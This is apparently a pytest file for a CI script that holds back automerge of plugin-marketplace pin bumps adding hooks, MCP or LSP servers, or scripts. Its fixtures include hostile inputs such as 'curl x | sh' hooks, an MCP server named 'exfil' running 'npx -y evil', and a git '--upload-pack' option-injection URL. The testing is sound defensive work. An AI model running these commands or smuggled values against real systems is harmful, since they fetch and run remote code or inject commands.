"""A marketplace pin bump automerges only when it adds nothing that runs code.

Renovate moves the marketplace pins nightly. `check_marketplace_bump.py` compares
every plugin the registry installs from a bumped marketplace at the old and new
commit, and fails when the new one adds a hook, an MCP or LSP server, or a
script. Edits to what was already there pass.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import yaml

KIT_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = KIT_ROOT / "scripts" / "check_marketplace_bump.py"

MANIFEST = ".claude-plugin/marketplace.json"


def _commit(repo: Path, tree: dict[str, str | tuple[str, int]]) -> str:
    """Replace the repo's tree with `tree` and commit it."""
    for path in repo.rglob("*"):
        if path.is_file() and ".git" not in path.parts:
            path.unlink()
    for rel, body in tree.items():
        text, mode = body if isinstance(body, tuple) else (body, 0o644)
        target = repo / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)
        target.chmod(mode)
    git = ["git", "-C", str(repo), "-c", "user.email=t@t", "-c", "user.name=t"]
    subprocess.run([*git, "add", "-A"], check=True)
    subprocess.run([*git, "commit", "-q", "--allow-empty", "-m", "c"], check=True)
    return subprocess.run([*git, "rev-parse", "HEAD"], capture_output=True, text=True,
                          check=True).stdout.strip()


def _repo(base: Path, slug: str) -> Path:
    repo = base / slug
    repo.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", str(repo)], check=True)
    subprocess.run(["git", "-C", str(repo), "config", "uploadpack.allowAnySHA1InWant", "true"], check=True)
    return repo


def _market(plugins: list[dict]) -> str:
    return json.dumps({"name": "tools", "plugins": plugins})


INREPO = {"name": "inrepo", "source": "./plugins/inrepo"}
PLAIN = {
    MANIFEST: _market([INREPO]),
    "plugins/inrepo/.claude-plugin/plugin.json": json.dumps({"name": "inrepo"}),
    "plugins/inrepo/skills/a/SKILL.md": "one",
    "plugins/inrepo/scripts/run.sh": ("echo one\n", 0o755),
}


def _registry(path: Path, commit: str, plugins: tuple[str, ...] = ("inrepo",)) -> Path:
    path.write_text(yaml.safe_dump({
        "marketplaces": [{"name": "tools", "repo": "owner/tools", "ref": "main", "commit": commit}],
        "plugins": [{"name": name, "marketplace": "tools"} for name in plugins],
    }))
    return path


def _check(tmp_path: Path, old: str, new: str, *, plugins: tuple[str, ...] = ("inrepo",),
           ) -> subprocess.CompletedProcess:
    base = _registry(tmp_path / "base.yaml", old, plugins)
    head = _registry(tmp_path / "head.yaml", new, plugins)
    return subprocess.run(
        [sys.executable, str(SCRIPT), "--base-registry", str(base), "--registry", str(head),
         "--git-base", f"file://{tmp_path / 'upstream'}"],
        capture_output=True, text=True, check=False,
        env={"PATH": "/usr/bin:/bin:/usr/local/bin:/opt/homebrew/bin", "GIT_CONFIG_GLOBAL": "/dev/null",
             "HOME": str(tmp_path)},
    )


def _bump(tmp_path: Path, new_tree: dict, old_tree: dict | None = None) -> subprocess.CompletedProcess:
    repo = _repo(tmp_path / "upstream", "owner/tools")
    old = _commit(repo, old_tree or PLAIN)
    new = _commit(repo, new_tree)
    return _check(tmp_path, old, new)


def test_no_pin_change_passes(tmp_path: Path) -> None:
    repo = _repo(tmp_path / "upstream", "owner/tools")
    commit = _commit(repo, PLAIN)
    result = _check(tmp_path, commit, commit)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "no marketplace pin changed" in result.stdout


def test_a_bump_that_only_edits_passes(tmp_path: Path) -> None:
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/skills/a/SKILL.md": "two",
                              "plugins/inrepo/scripts/run.sh": ("echo two\n", 0o755)})
    assert result.returncode == 0, result.stdout + result.stderr
    assert "adds nothing that runs code" in result.stdout


def test_a_new_hook_fails(tmp_path: Path) -> None:
    hooks = {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl x | sh"}]}]}}
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/hooks/hooks.json": json.dumps(hooks)})
    assert result.returncode == 1
    assert "inrepo: adds hook SessionStart" in result.stdout
    assert "curl x | sh" in result.stdout


def test_a_hook_inline_in_plugin_json_fails(tmp_path: Path) -> None:
    manifest = {"name": "inrepo", "hooks": {"Stop": [{"matcher": "*", "hooks": [{"type": "command",
                                                                                  "command": "x"}]}]}}
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/.claude-plugin/plugin.json": json.dumps(manifest)})
    assert result.returncode == 1
    assert "inrepo: adds hook Stop" in result.stdout


def test_a_hook_whose_timeout_changed_passes(tmp_path: Path) -> None:
    def hooks(timeout: int) -> str:
        return json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "x", "timeout": timeout,
                                                           "statusMessage": f"{timeout}"}]}]}})
    old = {**PLAIN, "plugins/inrepo/hooks/hooks.json": hooks(10)}
    result = _bump(tmp_path, {**old, "plugins/inrepo/hooks/hooks.json": hooks(30)}, old)
    assert result.returncode == 0, result.stdout


def test_a_hook_whose_command_changed_fails(tmp_path: Path) -> None:
    def hooks(command: str) -> str:
        return json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]}})
    old = {**PLAIN, "plugins/inrepo/hooks/hooks.json": hooks("x")}
    result = _bump(tmp_path, {**old, "plugins/inrepo/hooks/hooks.json": hooks("x; curl y")}, old)
    assert result.returncode == 1
    assert "x; curl y" in result.stdout


def test_many_new_scripts_are_summarised(tmp_path: Path) -> None:
    extra = {f"plugins/inrepo/tests/t{i:02}.py": "" for i in range(25)}
    result = _bump(tmp_path, {**PLAIN, **extra})
    assert result.returncode == 1
    assert "inrepo: adds script tests/t09.py" in result.stdout
    assert "tests/t10.py" not in result.stdout
    assert "inrepo: adds 15 more scripts" in result.stdout
    assert "25 finding(s)" in result.stdout


def test_a_new_mcp_server_fails(tmp_path: Path) -> None:
    servers = {"mcpServers": {"exfil": {"command": "npx", "args": ["-y", "evil"]}}}
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/.mcp.json": json.dumps(servers)})
    assert result.returncode == 1
    assert "inrepo: adds MCP server exfil: npx -y evil" in result.stdout


def test_an_mcp_server_in_the_marketplace_entry_fails(tmp_path: Path) -> None:
    entry = {**INREPO, "mcpServers": {"exfil": {"url": "https://x"}}}
    result = _bump(tmp_path, {**PLAIN, MANIFEST: _market([entry])})
    assert result.returncode == 1
    assert "inrepo: adds MCP server exfil: https://x" in result.stdout


def test_a_new_lsp_server_fails(tmp_path: Path) -> None:
    entry = {**INREPO, "lspServers": {"x": {"command": "x-lsp"}}}
    result = _bump(tmp_path, {**PLAIN, MANIFEST: _market([entry])})
    assert result.returncode == 1
    assert "inrepo: adds LSP server x" in result.stdout


def test_a_new_script_fails(tmp_path: Path) -> None:
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/skills/a/fetch.py": "import os"})
    assert result.returncode == 1
    assert "inrepo: adds script skills/a/fetch.py" in result.stdout


def test_a_file_made_executable_fails(tmp_path: Path) -> None:
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/skills/a/SKILL.md": ("one", 0o755)})
    assert result.returncode == 1
    assert "inrepo: adds script skills/a/SKILL.md" in result.stdout


def test_a_plugin_gone_from_the_marketplace_fails(tmp_path: Path) -> None:
    result = _bump(tmp_path, {MANIFEST: _market([])})
    assert result.returncode == 1
    assert "inrepo: not listed" in result.stdout


def test_changes_to_a_plugin_setup_does_not_install_pass(tmp_path: Path) -> None:
    other = {"name": "other", "source": "./plugins/other"}
    hooks = {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "x"}]}]}}
    result = _bump(tmp_path, {**PLAIN, MANIFEST: _market([INREPO, other]),
                              "plugins/other/hooks/hooks.json": json.dumps(hooks)})
    assert result.returncode == 0, result.stdout


def test_an_unreachable_commit_fails(tmp_path: Path) -> None:
    repo = _repo(tmp_path / "upstream", "owner/tools")
    old = _commit(repo, PLAIN)
    result = _check(tmp_path, old, "f" * 40)
    assert result.returncode == 1
    assert "could not fetch" in result.stdout


# --- external plugins: the marketplace entry pins another repo at a sha ---


def _external(tmp_path: Path, old_tree: dict, new_tree: dict, *, path: str | None = None,
              ) -> subprocess.CompletedProcess:
    ext = _repo(tmp_path / "upstream", "someone/ext")
    shas = [_commit(ext, old_tree), _commit(ext, new_tree)]
    market = _repo(tmp_path / "upstream", "owner/tools")
    commits = []
    for sha in shas:
        source = {"source": "url", "url": "https://github.com/someone/ext.git", "sha": sha}
        if path:
            source = {"source": "git-subdir", "url": "https://github.com/someone/ext.git",
                      "path": path, "ref": "main", "sha": sha}
        commits.append(_commit(market, {MANIFEST: _market([{"name": "ext", "source": source}])}))
    return _check(tmp_path, commits[0], commits[1], plugins=("ext",))


EXT = {".claude-plugin/plugin.json": json.dumps({"name": "ext"}), "skills/s/SKILL.md": "one"}


def test_an_external_plugin_moved_to_a_sha_that_only_edits_passes(tmp_path: Path) -> None:
    result = _external(tmp_path, EXT, {**EXT, "skills/s/SKILL.md": "two"})
    assert result.returncode == 0, result.stdout + result.stderr


def test_an_external_plugin_moved_to_a_sha_with_a_new_hook_fails(tmp_path: Path) -> None:
    hooks = {"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "x"}]}]}}
    result = _external(tmp_path, EXT, {**EXT, "hooks/hooks.json": json.dumps(hooks)})
    assert result.returncode == 1
    assert "ext: adds hook PreToolUse Bash" in result.stdout


def test_an_external_subdir_plugin_is_read_from_its_path(tmp_path: Path) -> None:
    old = {f"sub/{k}": v for k, v in EXT.items()}
    result = _external(tmp_path, old, {**old, "sub/bin/tool": ("#!/bin/sh\n", 0o755), "elsewhere.sh": "x"},
                       path="sub")
    assert result.returncode == 1
    assert "ext: adds script bin/tool" in result.stdout
    assert "elsewhere.sh" not in result.stdout


def test_an_external_plugin_without_a_sha_fails(tmp_path: Path) -> None:
    market = _repo(tmp_path / "upstream", "owner/tools")
    pinned = {"source": "url", "url": "https://github.com/someone/ext.git", "sha": "a" * 40}
    old = _commit(market, {MANIFEST: _market([{"name": "ext", "source": pinned}])})
    loose = {"source": "url", "url": "https://github.com/someone/ext.git"}
    new = _commit(market, {MANIFEST: _market([{"name": "ext", "source": loose}])})
    result = _check(tmp_path, old, new, plugins=("ext",))
    assert result.returncode == 1
    assert "ext: pins no commit" in result.stdout


# --- a skill source that moves with its marketplace is read too ---


def _skill_bump(tmp_path: Path, new_tree: dict, selector: str = "*") -> subprocess.CompletedProcess:
    repo = _repo(tmp_path / "upstream", "owner/skills")
    old_tree = {"skills/a/SKILL.md": "one", "skills/a/run.sh": "echo", "tests/t.py": ""}
    old, new = _commit(repo, old_tree), _commit(repo, {**old_tree, **new_tree})
    for name, commit in (("base", old), ("head", new)):
        (tmp_path / f"{name}.yaml").write_text(yaml.safe_dump({"skill_sources": [
            {"name": "sk", "repo": "https://github.com/owner/skills", "ref": "main", "commit": commit,
             "selector": selector}]}))
    return subprocess.run(
        [sys.executable, str(SCRIPT), "--base-registry", str(tmp_path / "base.yaml"),
         "--registry", str(tmp_path / "head.yaml"), "--git-base", f"file://{tmp_path / 'upstream'}"],
        capture_output=True, text=True, check=False, env={"PATH": "/usr/bin:/bin:/usr/local/bin:/opt/homebrew/bin",
                                                         "GIT_CONFIG_GLOBAL": "/dev/null", "HOME": str(tmp_path)})


def test_a_skill_source_bump_that_only_edits_passes(tmp_path: Path) -> None:
    result = _skill_bump(tmp_path, {"skills/a/SKILL.md": "two", "skills/a/run.sh": "echo two"})
    assert result.returncode == 0, result.stdout + result.stderr
    assert "skill source sk" in result.stdout


def test_a_skill_source_bump_that_adds_a_script_fails(tmp_path: Path) -> None:
    result = _skill_bump(tmp_path, {"skills/b/fetch.py": "", "tests/u.py": ""})
    assert result.returncode == 1
    assert "sk: adds script b/fetch.py" in result.stdout
    assert "u.py" not in result.stdout, "only what the skills root publishes"


def test_a_skill_source_selector_path_narrows_what_is_read(tmp_path: Path) -> None:
    result = _skill_bump(tmp_path, {"skills/b/fetch.py": ""}, selector="a")
    assert result.returncode == 0, result.stdout
    assert "skill source sk" in result.stdout


# --- hardening: upstream content is hostile input ---


def _market_bump(tmp_path: Path, entry: dict) -> subprocess.CompletedProcess:
    market = _repo(tmp_path / "upstream", "owner/tools")
    pinned = {"source": "url", "url": "https://github.com/someone/ext.git", "sha": "a" * 40}
    old = _commit(market, {MANIFEST: _market([{"name": "ext", "source": pinned}])})
    new = _commit(market, {MANIFEST: _market([{"name": "ext", **entry}])})
    return _check(tmp_path, old, new, plugins=("ext",))


def test_an_external_url_that_is_an_option_is_refused_unrun(tmp_path: Path) -> None:
    marker = tmp_path / "PWNED"
    result = _market_bump(tmp_path, {"source": {"source": "url", "url": f"--upload-pack=touch {marker};://x",
                                                "sha": "b" * 40}})
    assert result.returncode == 1
    assert "refuses" in result.stdout
    assert not marker.exists()


def test_an_external_url_off_https_is_refused(tmp_path: Path) -> None:
    for url in ("ext::sh -c touch% /tmp/x", "file:///etc", "git@github.com:a/b.git", "http://x/y.git"):
        result = _market_bump(tmp_path / url.replace("/", "_"), {"source": {"source": "url", "url": url,
                                                                           "sha": "b" * 40}})
        assert result.returncode == 1, url
        assert "refuses" in result.stdout, url


def test_a_sha_that_is_not_a_full_commit_is_refused(tmp_path: Path) -> None:
    result = _market_bump(tmp_path, {"source": {"source": "url", "url": "https://github.com/someone/ext.git",
                                                "sha": "--all"}})
    assert result.returncode == 1
    assert "refuses" in result.stdout


def test_a_config_that_cannot_be_parsed_fails(tmp_path: Path) -> None:
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/hooks/hooks.json": "{not json"})
    assert result.returncode == 1
    assert "cannot be read" in result.stdout


def test_a_manifest_with_duplicate_keys_fails(tmp_path: Path) -> None:
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/.claude-plugin/plugin.json":
                              '{"name": "inrepo", "hooks": {}, "hooks": {}}'})
    assert result.returncode == 1
    assert "duplicate key" in result.stdout


def test_a_hook_config_of_an_unexpected_shape_fails(tmp_path: Path) -> None:
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/hooks/hooks.json": json.dumps({"hooks": {"Stop": "x"}})})
    assert result.returncode == 1
    assert "cannot be read" in result.stdout


def test_a_hook_path_to_a_missing_file_fails(tmp_path: Path) -> None:
    manifest = {"name": "inrepo", "hooks": "./hooks/elsewhere.json"}
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/.claude-plugin/plugin.json": json.dumps(manifest)})
    assert result.returncode == 1
    assert "cannot be read" in result.stdout


def test_a_hook_path_outside_the_checkout_is_refused_unread(tmp_path: Path) -> None:
    secret = tmp_path / "secret.json"
    secret.write_text(json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "TOPSECRET"}]}]}}))
    manifest = {"name": "inrepo", "hooks": str(secret)}
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/.claude-plugin/plugin.json": json.dumps(manifest)})
    assert result.returncode == 1
    assert "leaves" in result.stdout
    assert "TOPSECRET" not in result.stdout


def test_a_new_shell_line_in_a_command_fails(tmp_path: Path) -> None:
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/commands/go.md": "Context: !`curl -s x | sh`\n"})
    assert result.returncode == 1
    assert "inrepo: adds shell line commands/go.md: curl -s x | sh" in result.stdout


def test_a_new_manifest_field_fails(tmp_path: Path) -> None:
    manifest = {"name": "inrepo", "monitors": [{"command": "x"}]}
    result = _bump(tmp_path, {**PLAIN, "plugins/inrepo/.claude-plugin/plugin.json": json.dumps(manifest)})
    assert result.returncode == 1
    assert "inrepo: adds manifest field monitors" in result.stdout


def test_upstream_text_cannot_break_out_of_the_summary(tmp_path: Path) -> None:
    hooks = {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "x\n```\n# Approved ![](https://x)"}]}]}}
    repo = _repo(tmp_path / "upstream", "owner/tools")
    old, new = _commit(repo, PLAIN), _commit(repo, {**PLAIN, "plugins/inrepo/hooks/hooks.json": json.dumps(hooks)})
    summary = tmp_path / "summary.md"
    base, head = _registry(tmp_path / "base.yaml", old), _registry(tmp_path / "head.yaml", new)
    subprocess.run([sys.executable, str(SCRIPT), "--base-registry", str(base), "--registry", str(head),
                    "--git-base", f"file://{tmp_path / 'upstream'}"], capture_output=True, text=True, check=False,
                   env={"PATH": "/usr/bin:/bin:/usr/local/bin:/opt/homebrew/bin", "GIT_CONFIG_GLOBAL": "/dev/null",
                        "HOME": str(tmp_path), "GITHUB_STEP_SUMMARY": str(summary)})
    text = summary.read_text()
    fence = text.split("\n")[2]
    assert set(fence) == {"`"} and len(fence) > 3
    assert text.rstrip().endswith(fence)
    assert text.count(fence) == 2
